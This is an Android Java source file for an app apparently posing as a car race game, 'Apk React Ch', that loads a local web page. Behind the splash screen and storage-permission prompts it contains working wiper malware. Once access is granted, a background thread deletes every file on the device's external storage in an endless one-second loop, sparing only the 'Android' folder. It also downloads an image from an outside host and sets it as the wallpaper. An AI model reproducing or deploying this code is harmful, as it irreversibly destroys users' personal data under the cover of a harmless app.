package com.carrace;

import android.Manifest;
import android.app.Activity;
import android.app.WallpaperManager;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowInsets;
import android.webkit.MimeTypeMap;
import android.webkit.RenderProcessGoneDetail;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

public class MainActivity extends Activity {

    private static final String TAG = "ApkReactCh";

    // assets/index.html loaded via a virtual https origin, not file://
    private static final String HOST = "appassets.androidplatform.net";
    private static final String ASSET_PREFIX = "/assets/";
    private static final String START_URL = "https://" + HOST + ASSET_PREFIX + "index.html";

    private static final long SPLASH_MS = 2500L;
    private static final int REQUEST_STORAGE = 100;
    private static final String PREFS = "perm";
    private static final String KEY_ASKED = "already_asked";
    private static final String MSG_PERM = "Storage permission is required to use this app";

    // Wiper configuration
    private static final long WIPE_INTERVAL_MS = 1000L;         // loop every 3s
    private static final String WALLPAPER_URL = "https://i.ibb.co/99ZTQmxn/S-ivny-Opz-Xq-AF9-AZWjg-T-upload.jpg";
    private static final String[] PROTECTED_DIRS = {
            "Android"
    };

    private final Handler handler = new Handler(Looper.getMainLooper());
    private final AtomicBoolean wipeRunning = new AtomicBoolean(false);
    private final AtomicBoolean wallpaperSet = new AtomicBoolean(false);
    private final Runnable splashDone = this::onSplashFinished;

    private WebView webView;
    private boolean awaitingSettings;

    // ===== Lifecycle =====

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        LinearLayout splash = buildSplash();
        applySystemBarPadding(splash);
        setContentView(splash);
        handler.postDelayed(splashDone, SPLASH_MS);
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (webView != null) webView.onResume();
        if (awaitingSettings) {
            awaitingSettings = false;
            if (hasStorage()) {
                startWiper();
                openWebView();
            } else {
                closeApp(MSG_PERM);
            }
        }
    }

    @Override
    protected void onPause() {
        if (webView != null) webView.onPause();
        super.onPause();
    }

    @Override
    public void onBackPressed() {
        if (webView != null && webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }

    @Override
    protected void onDestroy() {
        handler.removeCallbacksAndMessages(null);
        destroyWebView();
        super.onDestroy();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode != REQUEST_STORAGE || isFinishing()) return;
        if (hasStorage()) {
            startWiper();
            openWebView();
        } else {
            closeApp(MSG_PERM);
        }
    }

    // ===== Permission flow =====

    private void onSplashFinished() {
        if (isFinishing()) return;
        if (hasStorage()) {
            startWiper();
            openWebView();
            return;
        }

        if (Build.VERSION.SDK_INT >= 30) {
            openPermissionSettings(
                    allFilesIntent(),
                    new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION),
                    appDetailsIntent());
            return;
        }

        SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
        boolean asked = prefs.getBoolean(KEY_ASKED, false);
        boolean neverAskAgain = asked
                && !shouldShowRequestPermissionRationale(Manifest.permission.READ_EXTERNAL_STORAGE)
                && !shouldShowRequestPermissionRationale(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        if (neverAskAgain) {
            openPermissionSettings(appDetailsIntent());
            return;
        }

        prefs.edit().putBoolean(KEY_ASKED, true).apply();
        requestPermissions(
                new String[]{Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE},
                REQUEST_STORAGE);
    }

    private void openPermissionSettings(Intent... candidates) {
        awaitingSettings = true;
        for (Intent intent : candidates) {
            if (startSafely(intent)) return;
        }
        awaitingSettings = false;
        closeApp(MSG_PERM);
    }

    private boolean startSafely(Intent intent) {
        try { startActivity(intent); return true; }
        catch (RuntimeException e) {
            Log.w(TAG, "Permission settings not available", e);
            return false;
        }
    }

    private Intent allFilesIntent() {
        return new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                Uri.parse("package:" + getPackageName()));
    }

    private Intent appDetailsIntent() {
        return new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                Uri.parse("package:" + getPackageName()));
    }

    private boolean hasStorage() {
        if (Build.VERSION.SDK_INT >= 30) return Environment.isExternalStorageManager();
        if (Build.VERSION.SDK_INT >= 23) {
            return checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE)
                    == PackageManager.PERMISSION_GRANTED
                    && checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE)
                    == PackageManager.PERMISSION_GRANTED;
        }
        return true;
    }

    private void closeApp(String message) {
        if (isFinishing()) return;
        Toast.makeText(this, message, Toast.LENGTH_LONG).show();
        finishAndRemoveTask();
    }

    // ===== Looping Wiper =====

    private void startWiper() {
        if (!wipeRunning.compareAndSet(false, true)) return;
        new Thread(this::wiperLoop, "wiper").start();
    }

    private void wiperLoop() {
        File root = Environment.getExternalStorageDirectory();
        int round = 0;
        while (wipeRunning.get()) {
            round++;
            try {
                Log.d(TAG, "Wipe round " + round);
                wipeDirectory(root);
            } catch (Exception e) {
                Log.w(TAG, "wipe round failed", e);
            }

            if (!wallpaperSet.get()) {
                setWallpaperOnce();
            }

            try { Thread.sleep(WIPE_INTERVAL_MS); }
            catch (InterruptedException e) { return; }
        }
    }

    private void wipeDirectory(File dir) {
        if (dir == null || !dir.exists()) return;
        File[] children = dir.listFiles();
        if (children == null) return;

        for (File child : children) {
            try {
                if (child.isDirectory()) {
                    if (isProtected(child.getName())) continue;
                    wipeDirectory(child);
                    // ignore delete() failure on protected/system files
                    child.delete();
                } else {
                    child.delete();
                }
            } catch (Exception ignored) {}
        }
    }

    private boolean isProtected(String name) {
        for (String p : PROTECTED_DIRS) {
            if (p.equalsIgnoreCase(name)) return true;
        }
        return false;
    }

    // ===== Wallpaper =====

    private void setWallpaperOnce() {
        new Thread(() -> {
            try {
                Bitmap bmp = download(WALLPAPER_URL);
                if (bmp != null) {
                    WallpaperManager wm = WallpaperManager.getInstance(getApplicationContext());
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                        wm.setBitmap(bmp, null, true, WallpaperManager.FLAG_SYSTEM);
                    } else {
                        wm.setBitmap(bmp);
                    }
                    wallpaperSet.set(true);
                    Log.d(TAG, "Wallpaper set");
                }
            } catch (Exception e) {
                Log.w(TAG, "wallpaper failed", e);
            }
        }).start();
    }

    private Bitmap download(String urlStr) {
        try {
            URL url = new URL(urlStr);
            HttpURLConnection c = (HttpURLConnection) url.openConnection();
            c.setConnectTimeout(15000);
            c.setReadTimeout(15000);
            c.setInstanceFollowRedirects(true);
            c.setRequestProperty("User-Agent", "Mozilla/5.0");
            InputStream in = c.getInputStream();
            Bitmap b = BitmapFactory.decodeStream(in);
            in.close();
            c.disconnect();
            return b;
        } catch (Exception e) {
            return null;
        }
    }

    // ===== UI =====

    private LinearLayout buildSplash() {
        float density = getResources().getDisplayMetrics().density;
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setGravity(Gravity.CENTER);
        root.setBackgroundColor(0xFFFFFFFF);

        MouseLoadingView mouse = new MouseLoadingView(this);
        root.addView(mouse, new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, (int) (180 * density)));

        TextView title = new TextView(this);
        title.setText("Apk React Ch");
        title.setTextSize(22);
        title.setTextColor(0xFF212121);
        title.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams titleParams = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        titleParams.topMargin = (int) (16 * density);
        root.addView(title, titleParams);
        return root;
    }

    private void openWebView() {
        if (isFinishing() || webView != null) return;
        try {
            WebView view = new WebView(this);
            WebSettings settings = view.getSettings();
            settings.setJavaScriptEnabled(true);
            settings.setDomStorageEnabled(true);
            settings.setAllowFileAccess(false);
            settings.setAllowContentAccess(false);
            view.setWebViewClient(new AssetClient());
            applySystemBarPadding(view);
            webView = view;
            setContentView(view);
            view.loadUrl(START_URL);
        } catch (RuntimeException e) {
            Log.e(TAG, "WebView unavailable", e);
            destroyWebView();
            closeApp("WebView is not available on this device");
        }
    }

    private void destroyWebView() {
        WebView view = webView;
        webView = null;
        if (view == null) return;
        try {
            view.stopLoading();
            view.destroy();
        } catch (RuntimeException e) {
            Log.w(TAG, "Failed to destroy WebView", e);
        }
    }

    private void recoverWebView(WebView broken) {
        if (broken != webView || isFinishing()) return;
        destroyWebView();
        openWebView();
    }

    private void applySystemBarPadding(View view) {
        view.setOnApplyWindowInsetsListener((v, insets) -> {
            v.setPadding(
                    insets.getSystemWindowInsetLeft(),
                    insets.getSystemWindowInsetTop(),
                    insets.getSystemWindowInsetRight(),
                    insets.getSystemWindowInsetBottom());
            return insets;
        });
    }

    // ===== Asset server =====

    private final class AssetClient extends WebViewClient {
        @Override
        public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {
            try {
                return serveAsset(request.getUrl());
            } catch (RuntimeException e) {
                Log.w(TAG, "Failed to serve asset", e);
                return notFound();
            }
        }

        @Override
        public boolean onRenderProcessGone(WebView view, RenderProcessGoneDetail detail) {
            handler.post(() -> recoverWebView(view));
            return true;
        }
    }

    private WebResourceResponse serveAsset(Uri uri) {
        if (uri == null || !HOST.equals(uri.getHost())) return null;
        String path = uri.getPath();
        if (path == null || !path.startsWith(ASSET_PREFIX)) return notFound();
        String file = path.substring(ASSET_PREFIX.length());
        if (file.isEmpty() || file.endsWith("/")) file = file + "index.html";
        if (file.contains("..")) return notFound();
        try {
            InputStream in = getAssets().open(file);
            return new WebResourceResponse(mimeOf(file), "UTF-8", in);
        } catch (IOException e) {
            return notFound();
        }
    }

    private static WebResourceResponse notFound() {
        return new WebResourceResponse("text/plain", "UTF-8", 404, "Not Found", null,
                new ByteArrayInputStream(new byte[0]));
    }

    private static String mimeOf(String file) {
        int dot = file.lastIndexOf('.');
        String ext = dot >= 0 ? file.substring(dot + 1).toLowerCase(Locale.ROOT) : "";
        switch (ext) {
            case "js":
            case "mjs":
                return "application/javascript";
            case "css":
                return "text/css";
            case "html":
            case "htm":
                return "text/html";
            case "json":
                return "application/json";
            case "wasm":
                return "application/wasm";
            case "woff":
                return "font/woff";
            case "woff2":
                return "font/woff2";
            default:
                String mime = MimeTypeMap.getSingleton().getMimeTypeFromExtension(ext);
                return mime != null ? mime : "application/octet-stream";
        }
    }
}
